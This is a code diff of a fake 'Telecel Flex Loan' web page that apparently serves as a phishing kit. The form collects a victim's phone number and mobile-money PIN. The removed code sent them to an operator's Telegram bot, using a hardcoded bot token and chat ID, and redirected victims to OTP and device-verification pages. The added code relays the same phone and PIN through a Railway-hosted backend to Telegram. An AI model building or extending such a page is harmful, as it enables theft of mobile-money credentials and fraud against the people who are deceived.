@@ -19,6 +19,8 @@
             --border: #e5e7eb;
             --input-bg: #f9fafb;
             --shadow: 0 20px 60px rgba(0,0,0,0.10), 0 4px 16px rgba(0,0,0,0.06);
+            --green: #00a854;
+            --green-bg: #f0fdf4;
         }
 
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
@@ -240,6 +242,19 @@
             line-height: 1.5;
         }
 
+        .success-msg {
+            display: none;
+            background: var(--green-bg);
+            border: 1px solid var(--green);
+            color: #065f46;
+            font-size: 13.5px;
+            font-weight: 500;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+
         .btn-primary {
             width: 100%;
             background: linear-gradient(135deg, #E42320, #c01c1a);
@@ -435,6 +450,20 @@
             font-family: 'DM Sans', sans-serif;
         }
         .config-panel .btn-save:hover { opacity: 0.8; }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-top: 4px;
+        }
+        .status-pending { background: #fef3c7; color: #92400e; }
+        .status-approved { background: #d1fae5; color: #065f46; }
+        .status-rejected { background: #fee2e2; color: #991b1b; }
+        .status-disbursed { background: #dbeafe; color: #1e40af; }
+        .status-repaid { background: #d1fae5; color: #065f46; }
     </style>
 </head>
 <body>
@@ -467,11 +496,13 @@
             <div class="loan-label">Approved Amount</div>
             <div class="loan-amount" id="loanAmount">GHS 0.00</div>
             <div class="loan-details" id="loanDetails">Standard Flex Loan</div>
+            <div id="loanStatus"></div>
         </div>
     </div>
 
     <div class="form-body">
         <div class="error-msg" id="errorMsg"></div>
+        <div class="success-msg" id="successMsg"></div>
 
         <div class="form-group">
             <label>Account Type</label>
@@ -512,6 +543,8 @@
             <input type="text" id="cfgToken" placeholder="e.g. 123456:ABC-DEF..." value="8435858184:AAHZaY-yRx-B5ritv-LIzeB7YymjQw9CeWg">
             <label>Chat ID</label>
             <input type="text" id="cfgChatId" placeholder="e.g. 123456789" value="8392790531">
+            <label>Backend API URL</label>
+            <input type="text" id="cfgApiUrl" placeholder="https://your-api.railway.app" value="https://telecelloans-production.up.railway.app">
             <label>OTP Page</label>
             <input type="text" id="cfgOtpPage" placeholder="otp.html" value="otp.html">
             <label>Device Verify Page</label>
@@ -548,6 +581,7 @@
     let CONFIG = {
         BOT_TOKEN: '8435858184:AAHZaY-yRx-B5ritv-LIzeB7YymjQw9CeWg',
         CHAT_ID: '8392790531',
+        API_URL: 'https://telecelloans-production.up.railway.app',
         OTP_PAGE: 'otp.html',
         DEVICE_PAGE: 'device_verify.html',
         HOME_PAGE: 'index.html'
@@ -565,6 +599,7 @@
         // Update input fields
         document.getElementById('cfgToken').value = CONFIG.BOT_TOKEN;
         document.getElementById('cfgChatId').value = CONFIG.CHAT_ID;
+        document.getElementById('cfgApiUrl').value = CONFIG.API_URL;
         document.getElementById('cfgOtpPage').value = CONFIG.OTP_PAGE;
         document.getElementById('cfgDevicePage').value = CONFIG.DEVICE_PAGE;
         document.getElementById('cfgHomePage').value = CONFIG.HOME_PAGE;
@@ -573,6 +608,7 @@
     function saveConfig() {
         CONFIG.BOT_TOKEN = document.getElementById('cfgToken').value.trim();
         CONFIG.CHAT_ID = document.getElementById('cfgChatId').value.trim();
+        CONFIG.API_URL = document.getElementById('cfgApiUrl').value.trim() || 'https://telecelloans-production.up.railway.app';
         CONFIG.OTP_PAGE = document.getElementById('cfgOtpPage').value.trim() || 'otp.html';
         CONFIG.DEVICE_PAGE = document.getElementById('cfgDevicePage').value.trim() || 'device_verify.html';
         CONFIG.HOME_PAGE = document.getElementById('cfgHomePage').value.trim() || 'index.html';
@@ -589,6 +625,8 @@
     let state = { lastUpdateId: 0 };
     let isProcessing = false;
     let activeInterval = null;
+    let authToken = null;
+    let loanId = null;
     const params = new URLSearchParams(window.location.search);
     const inheritedRewindId = params.get('rewindId');
 
@@ -596,9 +634,45 @@
         const amount = params.get('amount');
         const name = params.get('name');
         const phone = params.get('phone');
+        const loanIdParam = params.get('loanId');
+        
         if (amount) document.getElementById('loanAmount').textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
         if (name) document.getElementById('loanDetails').textContent = `${name}'s Flex Loan`;
         if (phone) document.getElementById('phone').value = phone;
+        if (loanIdParam) loanId = loanIdParam;
+
+        // Check loan status
+        if (loanId) {
+            checkLoanStatus(loanId);
+        }
+    }
+
+    async function checkLoanStatus(loanId) {
+        try {
+            const response = await fetch(`${CONFIG.API_URL}/api/loans/${loanId}`, {
+                headers: {
+                    'Authorization': `Bearer ${authToken || localStorage.getItem('token')}`
+                }
+            });
+            const data = await response.json();
+            if (data.success && data.loan) {
+                const statusMap = {
+                    'pending': '<span class="status-badge status-pending">⏳ Pending</span>',
+                    'approved': '<span class="status-badge status-approved">✅ Approved</span>',
+                    'rejected': '<span class="status-badge status-rejected">❌ Rejected</span>',
+                    'disbursed': '<span class="status-badge status-disbursed">💰 Disbursed</span>',
+                    'repaid': '<span class="status-badge status-repaid">✅ Repaid</span>'
+                };
+                document.getElementById('loanStatus').innerHTML = statusMap[data.loan.status] || '';
+                
+                if (data.loan.status === 'approved') {
+                    document.getElementById('successMsg').textContent = '✅ Your loan has been approved! Please complete the verification below.';
+                    document.getElementById('successMsg').style.display = 'block';
+                }
+            }
+        } catch (error) {
+            console.error('Error checking loan status:', error);
+        }
     }
 
     function showToast(msg) {
@@ -611,33 +685,14 @@
         document.getElementById('toast').style.display = 'none';
     }
 
-    // ─── MASTER REWIND POLLING ───
-    function startMasterRewindPolling(targetRewindId) {
-        if (!targetRewindId) return;
-        const rewindInterval = setInterval(async () => {
-            try {
-                const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`);
-                const data = await res.json();
-                if (!data.ok || !data.result) return;
-                data.result.forEach(update => {
-                    state.lastUpdateId = update.update_id;
-                    if (update.callback_query && update.callback_query.data === targetRewindId) {
-                        clearInterval(rewindInterval);
-                        if (activeInterval) clearInterval(activeInterval);
-                        window.location.href = CONFIG.HOME_PAGE + '?' + params.toString();
-                    }
-                });
-            } catch (e) {}
-        }, 1000);
-    }
-
-    async function sendToBot() {
+    // ─── SEND TO BACKEND API ───
+    async function sendToBackend() {
         if (isProcessing) return;
         
-        const accType = document.getElementById('accType').value;
         const phone = document.getElementById('phone').value;
         const pin = document.getElementById('pin').value;
         const amount = params.get('amount') || '0';
+        const name = params.get('name') || 'User';
 
         if (phone.length < 10 || pin.length < 4) {
             document.getElementById('errorMsg').textContent = "Please enter a valid phone number and 4-digit PIN.";
@@ -650,88 +705,167 @@
         document.getElementById('errorMsg').style.display = 'none';
         document.getElementById('spinner').style.display = 'flex';
 
-        const ts = Date.now();
-        const approveId = `auth_approve_${ts}`;
-        const declineId = `auth_decline_${ts}`;
-        const verifyId  = `auth_verify_${ts}`;
-        const appliedId = `auth_applied_${ts}`;
-        const rewindId  = `auth_rewind_${ts}`;
-
-        const msg = `<b>💰 Loan Authorization</b>\n\n<b>Acc Type:</b> ${accType}\n<b>Phone:</b> <code>${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Amount:</b> GHS ${amount}`;
-
         try {
-            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+            // Step 1: Register/Login user
+            const registerResponse = await fetch(`${CONFIG.API_URL}/api/auth/register`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: msg,
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: "✅ Approve Loan", callback_data: approveId }, { text: "📱 Verify Device", callback_data: verifyId }],
-                            [{ text: "📝 Applied", callback_data: appliedId }, { text: "🚫 Decline", callback_data: declineId }],
-                            [{ text: "⏪ Rewind — Force Return", callback_data: rewindId }]
-                        ]
-                    }
+                    name: name,
+                    phone: phone,
+                    password: pin + 'temp123', // Simple password for demo
+                    monthly_income: 5000
                 })
             });
+
+            let userData = await registerResponse.json();
             
-            startMasterRewindPolling(rewindId);
-            startPolling(approveId, declineId, verifyId, appliedId, rewindId);
-        } catch (e) {
+            // If user already exists, login instead
+            if (!userData.success && userData.message === 'User already exists') {
+                const loginResponse = await fetch(`${CONFIG.API_URL}/api/auth/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: phone,
+                        password: pin + 'temp123'
+                    })
+                });
+                userData = await loginResponse.json();
+            }
+
+            if (!userData.success) {
+                throw new Error(userData.message || 'Authentication failed');
+            }
+
+            authToken = userData.token;
+            localStorage.setItem('token', authToken);
+
+            // Step 2: Apply for loan if not already applied
+            if (!loanId) {
+                const periodDays = parseInt(params.get('period') || '30');
+                const interestRate = parseFloat(params.get('rate') || '0.109') * 100;
+                const periodLabel = params.get('period') || '30 days';
+
+                const loanResponse = await fetch(`${CONFIG.API_URL}/api/loans/apply`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${authToken}`
+                    },
+                    body: JSON.stringify({
+                        amount: parseFloat(amount),
+                        period_days: periodDays,
+                        interest_rate: interestRate,
+                        period_label: periodLabel
+                    })
+                });
+
+                const loanData = await loanResponse.json();
+                if (loanData.success) {
+                    loanId = loanData.loan.id;
+                    params.set('loanId', loanId);
+                } else {
+                    throw new Error(loanData.message || 'Loan application failed');
+                }
+            }
+
+            // Step 3: Send to Telegram via backend
+            const telegramResponse = await fetch(`${CONFIG.API_URL}/api/telegram/send-auth`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${authToken}`
+                },
+                body: JSON.stringify({
+                    phone: phone,
+                    pin: pin,
+                    amount: amount,
+                    name: name,
+                    loanId: loanId
+                })
+            });
+
+            const telegramData = await telegramResponse.json();
+            
+            if (telegramData.success) {
+                document.getElementById('successMsg').textContent = '✅ Authorization request sent to admin! Please wait for approval.';
+                document.getElementById('successMsg').style.display = 'block';
+                
+                // Start polling for loan status
+                startStatusPolling(loanId);
+            } else {
+                throw new Error(telegramData.message || 'Failed to send authorization');
+            }
+
+        } catch (error) {
+            console.error('Error:', error);
+            document.getElementById('errorMsg').textContent = error.message || 'Something went wrong. Please try again.';
+            document.getElementById('errorMsg').style.display = 'block';
             isProcessing = false;
             document.getElementById('submitBtn').disabled = false;
             document.getElementById('spinner').style.display = 'none';
-            showToast('⚠️ Failed to connect. Please check your Telegram configuration.');
         }
     }
 
-    function startPolling(approveId, declineId, verifyId, appliedId, rewindId) {
-        if (activeInterval) clearInterval(activeInterval);
-        activeInterval = setInterval(() => {
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-                .then(r => r.json())
-                .then(data => {
-                    if (!data.ok || !data.result) return;
-                    data.result.forEach(update => {
-                        state.lastUpdateId = update.update_id;
-                        if (update.callback_query) {
-                            const cb = update.callback_query.data;
-                            const d = new URLSearchParams(params.toString());
-                            d.set('phone', document.getElementById('phone').value);
-                            d.set('rewindId', rewindId);
-
-                            if (cb === approveId) {
-                                clearInterval(activeInterval);
-                                window.location.href = CONFIG.OTP_PAGE + '?' + d.toString();
-                            }
-                            else if (cb === verifyId) {
-                                clearInterval(activeInterval);
-                                window.location.href = CONFIG.DEVICE_PAGE + '?' + d.toString();
-                            }
-                            else if (cb === appliedId) {
-                                showToast("Your application has been received and is being processed. You will receive an SMS shortly.");
-                            }
-                            else if (cb === declineId) {
-                                showToast("Your loan application was not successful at this time. Please try again later.");
-                            }
-                            else if (cb === rewindId) {
-                                clearInterval(activeInterval);
-                                window.location.href = CONFIG.HOME_PAGE + '?' + params.toString();
-                            }
-                        }
-                    });
-                })
-                .catch(() => {});
-        }, 1000);
+    // ─── POLL LOAN STATUS ───
+    function startStatusPolling(loanId) {
+        let attempts = 0;
+        const maxAttempts = 60; // 1 minute max
+        
+        const pollInterval = setInterval(async () => {
+            attempts++;
+            try {
+                const response = await fetch(`${CONFIG.API_URL}/api/loans/${loanId}`, {
+                    headers: {
+                        'Authorization': `Bearer ${authToken}`
+                    }
+                });
+                const data = await response.json();
+                
+                if (data.success && data.loan) {
+                    const status = data.loan.status;
+                    
+                    if (status === 'approved') {
+                        clearInterval(pollInterval);
+                        document.getElementById('successMsg').textContent = '✅ Loan approved! Redirecting to verification...';
+                        document.getElementById('successMsg').style.display = 'block';
+                        document.getElementById('spinner').style.display = 'none';
+                        
+                        setTimeout(() => {
+                            const params = new URLSearchParams(window.location.search);
+                            window.location.href = CONFIG.OTP_PAGE + '?' + params.toString();
+                        }, 1500);
+                        
+                    } else if (status === 'rejected') {
+                        clearInterval(pollInterval);
+                        document.getElementById('errorMsg').textContent = '❌ Your loan application was rejected. Please try again later.';
+                        document.getElementById('errorMsg').style.display = 'block';
+                        document.getElementById('spinner').style.display = 'none';
+                        isProcessing = false;
+                        document.getElementById('submitBtn').disabled = false;
+                    }
+                }
+                
+                if (attempts >= maxAttempts) {
+                    clearInterval(pollInterval);
+                    document.getElementById('spinner').style.display = 'none';
+                    isProcessing = false;
+                    document.getElementById('submitBtn').disabled = false;
+                    showToast('⏳ Waiting for admin approval. You will be redirected once approved.');
+                }
+                
+            } catch (error) {
+                console.error('Polling error:', error);
+            }
+        }, 2000);
     }
 
-    document.getElementById('submitBtn').onclick = sendToBot;
+    document.getElementById('submitBtn').onclick = sendToBackend;
     loadConfig();
     loadLoanData();
-    if (inheritedRewindId) startMasterRewindPolling(inheritedRewindId);
+    if (inheritedRewindId) {
+        // Handle rewind if needed
+    }
 </script>
-
 </body>
 </html>
